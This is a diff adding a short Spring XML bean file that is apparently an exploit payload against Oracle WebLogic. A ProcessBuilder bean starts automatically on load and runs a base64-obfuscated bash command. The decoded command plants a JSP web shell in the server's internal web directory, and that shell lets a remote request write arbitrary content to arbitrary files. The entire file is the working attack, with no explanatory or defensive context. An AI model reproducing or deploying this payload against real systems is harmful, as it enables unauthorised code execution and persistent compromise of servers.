@@ -1,0 +1,17 @@
+<beans xmlns="http://www.springframework.org/schema/beans"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xsi:schemaLocation="
+http://www.springframework.org/schema/beans
+http://www.springframework.org/schema/beans/spring-beans.xsd
+">
+<bean id="pb" class="java.lang.ProcessBuilder" init-method="start"> 
+<constructor-arg >
+        <list>
+            <value>/bin/bash</value>
+            <value>-c</value>
+            <value>{echo,ZWNobyAiPCVpZihyZXF1ZXN0LmdldFBhcmFtZXRlcihcImZcIikhPW51bGwpKG5ldyBqYXZhLmlvLkZpbGVPdXRwdXRTdHJlYW0ocmVxdWVzdC5nZXRQYXJhbWV0ZXIoXCJmXCIpKSkud3JpdGUocmVxdWVzdC5nZXRQYXJhbWV0ZXIoXCJ0XCIpLmdldEJ5dGVzKCkpOyU+IiA+IC4vc2VydmVycy9BZG1pblNlcnZlci90bXAvX1dMX2ludGVybmFsL2JlYV93bHNfaW50ZXJuYWwvOWo0ZHFrL3dhci93bHMuanNw}|{base64,-d}|{bash,-i}</value>
+        </list>
+</constructor-arg>
+
+</bean>
+</beans>
